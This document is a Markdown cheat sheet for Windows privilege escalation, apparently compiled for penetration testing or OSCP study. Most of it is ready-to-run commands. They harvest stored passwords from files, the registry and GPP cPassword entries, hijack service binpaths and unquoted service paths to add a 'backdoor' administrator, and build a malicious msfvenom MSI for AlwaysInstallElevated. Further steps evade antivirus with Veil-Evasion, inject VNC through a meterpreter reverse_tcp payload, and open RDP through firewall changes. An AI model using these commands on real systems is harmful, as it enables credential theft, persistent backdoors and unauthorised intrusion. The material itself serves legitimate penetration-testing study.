# Windows Privilege escalation

## Information Gathering
+ What system are we connected to?

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

+ Get the hostname and username (if available)

`hostname`
`echo %username%``

+ Learn about your environment

`SET`
`echo %PATH%`

+ List other users on the box

`net users
net user <username>`

+ Networking/Routing Info
`ipconfig /all`
`route print`
`arp -A`

+ Active Network Connections and services only viewable from the inside

netstat -ano

+ Firewall Status (only on Win XP SP2 and above)
```
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule all
```
+ Scheduled tasks

`schtasks /query /fo LIST /v`

+ Check how Running processes link to started services

`tasklist /SVC`

+ Windows services that are started:

`net start`

+ Driver madness (3rd party drivers may have holes)

`DRIVERQUERY`

+ Check systeminfo output against exploit-suggester

https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt

+ Run windows-privesc script

https://github.com/pentestmonkey/windows-privesc-check

##WMIC
Windows Management Instrumentation Command Line
Windows XP requires admin

+ Use wmic_info.bat script for automation
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

+ System Info

`wmic COMPUTERSYSTEM get TotalPhysicalMemory,caption
wmic CPU Get /Format:List`

+ Check patch level

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing
Search patches for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

Examples:

Windows 2K SP4 - Windows 7 (x86): KiTrap0D (KB979682)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682"  

Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good
exploit - unlikely Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass))

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"

## Stored Credentials

findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

### Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

### Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

## Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.

C:\sysprep.inf
C:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

When the box is connected to a Domain:

Look for Groups.xml in SYSVOL

GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.

Search for other policy preference files that can have the optional “cPassword” attribute set:

Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes


## Automated Tools
+ Metasploit Module
post/windows/gather/credentials/gpp
post/windows/gather/enum_unattend
+ Powersploit
https://github.com/PowerShellMafia/PowerSploit
Get-GPPPassword
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
Search filesystem:
Search for specific keywords:
dir /s *pass* == *cred* == *vnc* == *.config*
+ Search certain file types for a keyword
findstr /si password *.xml *.ini *.txt
Search for certain files
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini
Grep the registry for keywords (e.g. “passwords”)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

## Find writeable files

dir /a-r-d /s /b

/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
/s means recurse subdirectories
/b means bare format. Path and filename only.

## Trusted Service Paths

List all unquoted service paths (minus built-in Windows services) on our compromised machine:
`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

Suppose we found:

C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
If you look at the registry entry for this service with Regedit you can see the ImagePath value is:
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
To be secure it should be like this:
“C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”
When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:
C:\Program.exe
C:\Program Files.exe
C:\Program Files(x86)\Program Folder\A.exe
...
## Check permissions of folder path

icacls "C:\Program Files (x86)\Program Folder"

If we can write in the path we plant a backdoor with the same name with the service and restart the service.

##Metasploit module:
exploit/windows/local/trusted_service_path
Vulnerable Services
Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
Note: Windows XP shipped with several vulnerable built-in services.
## Use accesschk from SysInternals to search for these vulnerable services.
https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx
For Windows XP, version 5.2 of accesschk is needed:
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\
Then query the service using Windows sc:
sc qc <vulnerable service name>
Then change the binpath to execute your own commands (restart of the service will most likely be needed):
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
sc stop <vuln-service>
sc start <vuln-service>
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
sc stop <vuln-service>
sc start <vuln-service>
Note - Might need to use the depend attribute explicitly:
sc stop <vuln-service>
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
sc start <vuln-service>


###Metasploit module:
exploit/windows/local/service_permissions
##AlwaysInstallElevated

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

Check if these 2 registry values are set to “1”:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

If they are, create your own malicious msi:

msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi

Then use msiexec on victim to execute your msi:

msiexec /quiet /qn /i C:\evil.msi

###Metasploit module:
exploit/windows/local/always_install_elevated

##Bypassing AV

Use Veil-Evasion
Create your own executable by “compiling” PowerShell scripts
Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.
Getting GUI

+ Using meterpreter, inject vnc session:
run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false
+ Enable RDP:

netsh firewall set service RemoteDesktop enable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t
REG_DWORD /d 0 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"
OR:
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=tcp
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=udp
OR (meterpreter)
run post/windows/manage/enable_rdp
https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/



https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
http://www.fuzzysecurity.com/tutorials/16.html
http://www.greyhathacker.net/?p=738
https://toshellandback.com/2015/11/24/ms-priv-esc/
https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
https://www.toshellandback.com/2015/08/30/gpp/
https://www.toshellandback.com/2015/09/30/anti-virus/
https://www.veil-framework.com/framework/veil-evasion/
https://www.toshellandback.com/2015/11/24/ms-priv-esc/
https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/
https://pentestlab.blog/2017/04/19/stored-credentials/
